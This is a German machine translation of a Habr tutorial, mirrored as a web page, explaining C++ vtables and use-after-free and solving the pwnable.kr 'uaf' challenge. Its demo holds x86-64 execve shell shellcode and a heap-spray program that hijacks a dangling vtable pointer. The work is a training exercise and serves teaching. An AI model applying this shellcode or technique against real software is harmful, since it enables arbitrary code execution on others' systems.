<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üßëüèª üàÇÔ∏è üôçüèΩ L√∂sen eines Jobs mit pwnable.kr 16 - uaf. Verwendung nach freier Sicherheitsl√ºcke üë®üèΩ‚Äç‚öïÔ∏è üîã ü§üüèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In diesem Artikel werden wir uns mit UAF befassen und auch die 16. Aufgabe auf der Website pwnable.kr l√∂sen . 

 Organisationsinformationen  Speziell ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>L√∂sen eines Jobs mit pwnable.kr 16 - uaf. Verwendung nach freier Sicherheitsl√ºcke</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/462471/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/al/py/ef/alpyefagnx81cc2xc1ncjqs8lus.png" alt="Bild"></div><br>  In diesem Artikel werden wir uns mit UAF <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">befassen</a> und auch die 16. Aufgabe auf der Website <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">pwnable.kr l√∂sen</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Organisationsinformationen</b> <div class="spoiler_text">  Speziell f√ºr diejenigen, die etwas Neues lernen und sich in einem der Bereiche Informations- und Computersicherheit entwickeln m√∂chten, werde ich √ºber die folgenden Kategorien schreiben und sprechen: <br><ul><li>  PWN; </li><li>  Kryptographie (Krypto); </li><li>  Netzwerktechnologien (Netzwerk); </li><li>  Reverse (Reverse Engineering); </li><li>  Steganographie (Stegano); </li><li>  Suche und Ausnutzung von WEB-Schwachstellen. </li></ul><br>  Dar√ºber hinaus werde ich meine Erfahrungen in den Bereichen Computerforensik, Analyse von Malware und Firmware, Angriffe auf drahtlose Netzwerke und lokale Netzwerke, Durchf√ºhrung von Pentests und Schreiben von Exploits teilen. <br><a name="habracut"></a><br>  Damit Sie sich √ºber neue Artikel, Software und andere Informationen informieren k√∂nnen, habe ich <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">in Telegram</a> einen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Kanal</a> und eine <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Gruppe eingerichtet, um alle Probleme</a> im Bereich ICD <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">zu diskutieren</a> .  Au√üerdem werde ich Ihre pers√∂nlichen Anfragen, Fragen, Vorschl√§ge und Empfehlungen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">pers√∂nlich</a> pr√ºfen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">und alle beantworten</a> . <br><cut></cut><br>  Alle Informationen werden nur zu Bildungszwecken bereitgestellt.  Der Autor dieses Dokuments √ºbernimmt keine Verantwortung f√ºr Sch√§den, die jemandem durch die Verwendung von Kenntnissen und Methoden entstehen, die durch das Studium dieses Dokuments erworben wurden. <br></div></div><br><h2>  Vererbung und virtuelle Methoden </h2><br>  Virtuelle Funktion - in der objektorientierten Programmierung eine Klassenfunktion, die in Nachfolgeklassen √ºberschrieben werden kann.  Daher muss der Programmierer nicht den genauen Typ des Objekts kennen, um mit ihm √ºber virtuelle Methoden arbeiten zu k√∂nnen: Es reicht aus zu wissen, dass das Objekt zur Klasse oder zum Nachkommen der Klasse geh√∂rt, in der die Methode deklariert ist. <br><cut></cut><br>  Nehmen wir einfach an, wir haben eine Basisklasse Animal definiert, die eine virtuelle Streifenfunktion hat.  Die Tierklasse kann also zwei Kinderklassen haben: Katze und Hund.  Die virtuelle Funktion Cat: sreak () gibt myau aus und Dog: sreak gibt gav aus.  Aber wenn dieselbe Struktur im Speicher gespeichert ist, wie versteht das Programm, welche der Streifen aufgerufen werden sollen? <br><br>  Alle Arbeiten werden von der Tabelle der virtuellen Methoden (TVM) oder von vtable bereitgestellt. <br><cut></cut><br>  Jede Klasse hat ihren eigenen TVM und der Compiler f√ºgt seinen virtuellen Tabellenzeiger (vptr - Zeiger auf vtable) als erste lokale Variable dieses Objekts hinzu.  Lass es uns √ºberpr√ºfen. <br><pre><code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; class ANIMAL{ private: int var1 = 0x11111111; public: virtual void func1(){ printf("Class Animal - func1\n"); } virtual void func2(){ printf("Class Animal - func2\n"); } }; class CAT : public ANIMAL { public: virtual void func1(){ printf("Class Cat - func1\n"); } virtual void func2(){ printf("Class Cat - func2\n"); } }; int main(){ ANIMAL *p1 = new ANIMAL(); ANIMAL *p2 = new CAT(); ANIMAL *ptr; ptr = p1; ptr-&gt;func1(); ptr-&gt;func2(); ptr = dynamic_cast&lt;CAT*&gt;(p2); ptr-&gt;func1(); ptr-&gt;func2(); return 0; }</span></span></span></span></code> </pre> <br>  Kompilieren und ausf√ºhren, um die Ausgabe anzuzeigen. <br><pre> <code class="bash hljs">g++ ex.c -o ex.bin</code> </pre> <br><img src="https://habrastorage.org/webt/33/uo/cl/33uoclc85hu4htwgt3gvr-ekdei.png" alt="Bild"><br><br>  F√ºhren Sie nun unter dem Debugger in der IDA aus und stoppen Sie, bevor Sie die erste Funktion aufrufen.  Gehen Sie zum HEX-View-Fenster und synchronisieren Sie es mit dem RAX-Register. <br><br><img src="https://habrastorage.org/webt/rm/cj/ln/rmcjlnazk5l-qvjzi3gbhuhsvdm.png" alt="Bild"><br><br>  Im ausgew√§hlten Fragment sehen wir den Wert der Variablen var1, wenn Variablen vom Typ ANIMALS und CAT definiert werden.  Wie bereits erw√§hnt, befinden sich vor beiden Variablen Adressen. Dies sind Zeiger auf VMT (0x559f9898fd90 und 0x559f9898fd70). <br><cut></cut><br>  Mal sehen, was passiert, wenn func1 aufgerufen wird: <br><ol><li>  Zun√§chst haben wir in RAX mithilfe des ptr-Zeigers eine Adresse f√ºr das Objekt. </li><li>  Weiterhin wird in RAX der erste Wert des Objekts gelesen - ein Zeiger auf VMT (auf sein erstes Element). </li><li>  In RAX wird der erste Wert von VMT gelesen - ein Zeiger auf dieselbe virtuelle Methode. </li><li>  In RDX wird ein Zeiger auf das Objekt eingegeben (h√§ufiger dies). </li><li>  Ein virtueller Methodenaufruf wird durchgef√ºhrt. </li></ol><br><br><img src="https://habrastorage.org/webt/rw/sl/lf/rwsllfoj_r3n_h8pqcz5ez3xdxk.png" alt="Bild"><br><br>  Wenn func2 aufgerufen wird, passiert dasselbe, mit einer Ausnahme, dass nicht der erste Datensatz (RAX), sondern der zweite (RAX + 8) von VMT gelesen wird.  Dies ist der Mechanismus f√ºr die Arbeit mit virtuellen Methoden. <br><br><img src="https://habrastorage.org/webt/vu/jp/qa/vujpqaxpie8rg3hwuiewisoswjc.png" alt="Bild"><br><cut></cut><br><h2>  UAF </h2><br>  Diese Sicherheitsanf√§lligkeit ist typisch f√ºr den Heap, da der Stapel zum Speichern von Daten einer kleinen Menge (lokale Variablen) ausgelegt ist.  Der Heap ist ein dynamischer Speicher und eignet sich perfekt zum Speichern gro√üer Datenmengen.  In diesem Fall kann die Zuweisung und Freigabe des Speichers w√§hrend der Programmausf√ºhrung erfolgen.  Aus diesem Grund muss jedoch √ºberwacht werden, welcher Speicher belegt ist und welcher nicht.  Dazu ben√∂tigen Sie einen Service-Header f√ºr den zugewiesenen Speicherblock.  Es enth√§lt die Startadresse und einen Zeiger auf das erste Element des Blocks.  Und w√§hrend der Haufen im Gegensatz zum Stapel nach unten w√§chst. <br><br>  Das Wesentliche an der Sicherheitsanf√§lligkeit ist, dass das Programm nach dem Freigeben des Speichers m√∂glicherweise auf diesen Bereich verweist.  Es gibt also h√§ngende Zeiger.  √Ñndern Sie den Programmcode und √ºberpr√ºfen Sie dies. <br><pre> <code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">main</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ ANIMAL *p1 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ANIMAL(); ANIMAL *p2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> CAT(); ANIMAL *ptr; ptr = p1; ptr-&gt;func1(); ptr-&gt;func2(); ptr = <span class="hljs-keyword"><span class="hljs-keyword">dynamic_cast</span></span>&lt;CAT*&gt;(p2); ptr-&gt;func1(); ptr-&gt;func2(); <span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> p2; ptr-&gt;func1(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>; }</code> </pre> <br><img src="https://habrastorage.org/webt/cd/wz/d1/cdwzd1qhhkzzjhh9kbrmkith4ci.png" alt="Bild"><br><br>  Lassen Sie uns herausfinden, wo das Programm abst√ºrzt.  In Analogie zum vorherigen Beispiel stoppe ich vor dem Aufrufen der Funktion und synchronisiere Hex-View mit RAX.  Wir sehen, auf welchem ‚Äã‚ÄãObjekt sich unser Objekt befinden soll.  Wenn Sie jedoch die folgende Anweisung ausf√ºhren, verbleibt 0 im RAX-Register. Wenn Sie bereits versuchen, 0 zu dereferenzieren, st√ºrzt das Programm ab. <br><br><img src="https://habrastorage.org/webt/a5/oy/zx/a5oyzxx4t_i-rf42au3l7ysas3o.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/rk/fj/tk/rkfjtklkfbmcuvukyejfwx8rgti.png" alt="Bild"><br><br>  F√ºr die Ausnutzung von UAF ist es daher erforderlich, den Shellcode in das Programm zu √ºbertragen und dann √ºber den h√§ngenden Zeiger (in VMT) zu seinem Anfang zu gelangen.  Dies ist m√∂glich, weil der Heap auf Anforderung einen Speicherblock zuweist, der zuvor freigegeben wurde, und auf diese Weise k√∂nnen wir VMT emulieren, das auf Shellcode verweist.  Mit anderen Worten, wo sich zuvor die Adresse der VMT-Funktion befand, befindet sich jetzt die Shellcode-Adresse.  Wir k√∂nnen jedoch nicht garantieren, dass der Speicher f√ºr das einzige ausgew√§hlte Objekt mit der gerade gel√∂schten Zone √ºbereinstimmt. Daher erstellen wir mehrere solcher Objekte in einer Schleife. <br><br>  Schauen wir uns ein Beispiel an.  Nehmen Sie zun√§chst den Shellcode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">von hier</a> . <br><pre> <code class="cpp hljs"><span class="hljs-string"><span class="hljs-string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span></span></code> </pre> <br>  Und erg√§nzen Sie unseren Code: <br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;string.h&gt; class ANIMAL{ private: int var1 = 0x11111111; public: virtual void func1(){ printf("Class Animal - func1\n"); } virtual void func2(){ printf("Class Animal - func2\n"); } }; class CAT : public ANIMAL { public: virtual void func1(){ printf("Class Cat - func1\n"); } virtual void func2(){ printf("Class Cat - func2\n"); } }; class EX_SHELL{ private: char n[8]; public: EX_SHELL(void* addr_in_VMT){ memcpy(n, &amp;addr_in_VMT, sizeof(void*)); } }; char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"; int main(){ ANIMAL *p1 = new ANIMAL(); ANIMAL *p2 = new CAT(); ANIMAL *ptr; ptr = p1; ptr-&gt;func1(); ptr-&gt;func2(); ptr = dynamic_cast&lt;CAT*&gt;(p2); ptr-&gt;func1(); ptr-&gt;func2(); delete p2; void* vmt[1]; vmt[0] = (void*) shellcode; for(int i=0; i&lt;0x10000; i++) new EX_SHELL(vmt); ptr-&gt;func1(); return 0; }</span></span></span></span></code> </pre> <br>  Nach dem Kompilieren und Ausf√ºhren erhalten wir eine vollst√§ndige Shell. <br><br><img src="https://habrastorage.org/webt/dn/m8/ez/dnm8ez66kibzhja7bof98xjk3sg.png" alt="Bild"><br><br><h2>  Uaf Jobl√∂sung </h2><br>  Wir klicken auf das von uaf signierte Symbol und es wird uns mitgeteilt, dass wir uns √ºber SSH mit dem Passwort Gast verbinden m√ºssen. <br><br><img src="https://habrastorage.org/webt/ai/4r/-q/ai4r-qsnwqswdyzs5ph9uvg1iqs.png" alt="Bild"><br><br>  Wenn verbunden, sehen wir das entsprechende Banner. <br><br><img src="https://habrastorage.org/webt/ne/bx/18/nebx18bv2viitutyrcuckq1mvzy.png" alt="Bild"><br><br>  Lassen Sie uns herausfinden, welche Dateien sich auf dem Server befinden und welche Rechte wir haben. <br><br><img src="https://habrastorage.org/webt/rr/sv/ug/rrsvug_oodh7hlvnzdhwsagfkhe.png" alt="Bild"><br><br><div class="spoiler">  <b class="spoiler_title">Sehen wir uns den Quellcode an</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;fcntl.h&gt; #include &lt;iostream&gt; #include &lt;cstring&gt; #include &lt;cstdlib&gt; #include &lt;unistd.h&gt; using namespace std; class Human{ private: virtual void give_shell(){ system("/bin/sh"); } protected: int age; string name; public: virtual void introduce(){ cout &lt;&lt; "My name is " &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; "I am " &lt;&lt; age &lt;&lt; " years old" &lt;&lt; endl; } }; class Man: public Human{ public: Man(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; "I am a nice guy!" &lt;&lt; endl; } }; class Woman: public Human{ public: Woman(string name, int age){ this-&gt;name = name; this-&gt;age = age; } virtual void introduce(){ Human::introduce(); cout &lt;&lt; "I am a cute girl!" &lt;&lt; endl; } }; int main(int argc, char* argv[]){ Human* m = new Man("Jack", 25); Human* w = new Woman("Jill", 21); size_t len; char* data; unsigned int op; while(1){ cout &lt;&lt; "1. use\n2. after\n3. free\n"; cin &gt;&gt; op; switch(op){ case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; "your data is allocated" &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; } } return 0; }</span></span></span></span></code> </pre> <br></div></div><br>  Ganz am Anfang des Programms haben wir zwei Objekte von Klassen, die von der Klasse Human geerbt wurden.  Welches hat eine Funktion, die uns eine H√ºlle gibt. <br><br><img src="https://habrastorage.org/webt/zt/4a/ep/zt4aeptvx5frrqzll5s-mznrx7y.png" alt="Bild"><br><br>  Als n√§chstes sind wir eingeladen, eine von drei Aktionen vorzustellen: <br><ol><li>  Objektinformationen anzeigen; </li><li>  Schreiben in eine Reihe von Daten, die als Programmparameter akzeptiert werden; </li><li>  L√∂schen Sie das erstellte Objekt. </li></ol><br><br><img src="https://habrastorage.org/webt/7p/lk/nq/7plknqpzxgbq4kgoh5dk52ief8y.png" alt="Bild"><br><br>  Da die UAF-Sicherheitsanf√§lligkeit in dieser Aufgabe ber√ºcksichtigt wird, sollte der Plan wie folgt aussehen: Erstellen - L√∂schen - Schreiben auf den Heap - Empfangen von Informationen. <br><cut></cut><br>  Der einzige Schritt, √ºber den wir die volle Kontrolle haben, ist das Schreiben auf den Heap.  Vor der Aufnahme m√ºssen wir jedoch wissen, wie VMT nach diesen Objekten sucht und welche Adresse die Funktion hat, die uns die Shell gibt.  Anhand eines Beispiels haben wir verstanden, wie VMT funktioniert. Zeiger auf Adressen werden nacheinander gespeichert, d. H. <br>  func2 = * func1 + sizeof (* func1), func3 = * func1 + 2 * sizeof (* func2) usw. <br><br>  Da die erste Funktion in VMT give_shell () ist und die Funktion Man :: Introduce () aufgerufen wird, ist die zweite Adresse von VMT die eingegebene Adresse.  Angesichts des 64-Bit-Systems: * Introduce = * give_shell + 8. Wir werden eine Best√§tigung daf√ºr finden: <br><br><img src="https://habrastorage.org/webt/uz/3c/-m/uz3c-mkowzsvm9cikvxk58bdf5i.png" alt="Bild"><br><br>  Die Zeile main + 272 best√§tigt unsere Annahme, da sich die Adresse relativ zur Basis um 8 erh√∂ht. <br><br>  Legen Sie einen Haltepunkt fest und √ºberpr√ºfen Sie den Inhalt von EAX, um die Basisadresse zu ermitteln. <br><br><img src="https://habrastorage.org/webt/ie/zd/rd/iezdrduch5fu6njt7_bxf1covra.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/u-/mu/ix/u-muixeafwiucui0zofe97mixii.png" alt="Bild"><br><br><img src="https://habrastorage.org/webt/ms/eu/qr/mseuqrwyfwkh7vwayzo9rl4vql8.png" alt="Bild"><br><br>  Wir haben die Basisadresse gefunden: 0x0000000000401570.  Daher m√ºssen wir anstelle der Shell die um 8 reduzierte Adresse give_shell () in den Heap schreiben, damit sie als VMT-Basis verwendet wird, w√§hrend das Programm um 8 erh√∂ht und uns eine Shell gibt. <br><br><img src="https://habrastorage.org/webt/sf/vg/4x/sfvg4xkane1z-htuaxhj2xo7h5a.png" alt="Bild"><br><br>  Das Programm als Parameter ist die Anzahl der Bytes, die es aus der Datei liest, und der Name der Datei.  Es bleibt ein wenig, die Daten zu √ºberschreiben. Sie m√ºssen einen Speicherblock in der Gr√∂√üe eines freigegebenen Blocks zuweisen.  Finden Sie die Gr√∂√üe des Blocks, der ein Objekt belegt. <br><br><img src="https://habrastorage.org/webt/dq/cy/zm/dqcyzmps7r9-cduwnzfst-w99g8.png" alt="Bild"><br><br>  Daher werden vor dem Erstellen des Objekts 0x18 = 24 Bytes reserviert.  Das hei√üt, wir m√ºssen eine Datei erstellen, die aus 24 Bytes besteht. <br><br><img src="https://habrastorage.org/webt/lu/94/k4/lu94k4006vxgturizvruy7ffye0.png" alt="Bild"><br><br>  Da das Programm zwei Objekte freigibt, m√ºssen wir die Daten zweimal schreiben. <br><br><img src="https://habrastorage.org/webt/wi/hv/v4/wihvv4mnb-t_uvgqw25bvxvivmi.png" alt="Bild"><br><br>  Wir bekommen die Muschel, lesen die Flagge, wir bekommen 8 Punkte. <br><br><img src="https://habrastorage.org/webt/a3/bg/eb/a3bgeb13bwvby4__w5dahqlsbtk.png" alt="Bild"><br><br>  Sie k√∂nnen sich uns <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">per Telegramm anschlie√üen</a> .  Das n√§chste Mal werden wir uns mit dem Ausrichten des Speichers befassen. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de462471/">https://habr.com/ru/post/de462471/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de462459/index.html">Hinzuf√ºgen von ZigBee-Ger√§ten zu Homebridge mithilfe von CC2531</a></li>
<li><a href="../de462461/index.html">Ergebnisse der GOES-17-Crash-Untersuchung</a></li>
<li><a href="../de462465/index.html">Verwenden der nativen Orte von Apple</a></li>
<li><a href="../de462467/index.html">Frontend Weekly Digest (29. Juli - 4. August 2019)</a></li>
<li><a href="../de462469/index.html">Einige √úberlegungen zum gleichzeitigen Rechnen in R f√ºr "Unternehmens" -Aufgaben</a></li>
<li><a href="../de462473/index.html">Wir entwickeln eine Umgebung f√ºr die Arbeit mit Microservices. Teil 1 Installation von Kubernetes HA auf Bare Metal (Debian)</a></li>
<li><a href="../de462475/index.html">Alexey Savvateev: Wie man Korruption mit Hilfe der Mathematik bek√§mpft (Nobelpreis f√ºr Wirtschaftswissenschaften f√ºr 2016)</a></li>
<li><a href="../de462477/index.html">Wissenschaftler behaupten, AI sei der Autor eines neuen Patents und versuchen, das Patentrecht zu √§ndern</a></li>
<li><a href="../de462479/index.html">Eskalation der lokalen Berechtigungen des Steam Windows-Clients 0 Tag</a></li>
<li><a href="../de462481/index.html">Geben Sie System-FAQs ein</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>